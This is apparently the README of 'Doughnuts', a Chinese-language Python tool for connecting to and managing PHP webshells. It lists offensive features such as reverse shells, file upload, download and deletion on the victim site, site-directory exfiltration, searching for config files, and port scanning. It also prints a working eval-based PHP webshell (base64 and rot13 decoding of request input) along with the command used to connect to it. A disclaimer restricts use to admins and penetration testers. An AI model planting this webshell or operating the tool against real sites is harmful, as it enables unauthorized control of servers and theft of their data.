# Doughnuts

*一个基于Python3.6+的PHPwebshell管理器*

# 更新

## V1.4

- 添加指令:修改文件
- 关闭debug模式
- 修复了某些情况下fwpf,fc指令无法使用的情况,现在发送数据时会关闭错误提示

## 特征

- 支持连接,记录,管理webshell,方便下一次连接
- 基于eval的连接,支持GET,POST,COOKIE,HEADERS四种连接方式
- 支持编码payload(已内置base64,str_rot13两种编码,可以通过添加encode文件夹中的py文件进行扩展),以实现连接带有解码的webshell
- 核心功能
    - 获取网站,系统信息
    - 获取一个临时的非完全交互式shell和webshell
    - 以php/python的方式反弹shell(windows/unix通用)
    - 读/写/上传/下载/删除网站文件
    - 网站目录打包下载
    - 寻找可写的PHP文件(以树状结构显示)
    - 寻找配置文件(文件名中包含cfg/config/db/database) 也可以通过修改代码来支持寻找更多的文件(以树状结构显示)
    - 输出disbale_functions
    - 端口扫描
- 易于扩展

## 依赖

- Python3.6+
- Python-requests
- Python-colorama

## 安装方法

```
安装PYTHON 3.6+
git clone https://github.com/WAY29/Doughnuts.git
进入Doughnuts目录下
pip install -r requirements.txt 或 pip install requests colorma
python doughnuts.py
enjoy it!
```

## 使用例子

假如要连接以下的webshell:

```php
<?php
error_reporting(0);
eval(str_rot13(base64_decode($_REQUEST['2333'])));/
?>
```

那么只需要运行Doughnuts.py,并输入以下命令:

```
connect http://localhost/test.php GET 2333 rot13 base64
```

即可成功连接至webshell

## 参考

灵感源自https://github.com/WangYihang/Webshell-Sniper

## 免责声明

本项目仅供网站管理人员与渗透测试人员学习与交流,任何使用本项目进行的一切未授权攻击行为与本人无关.

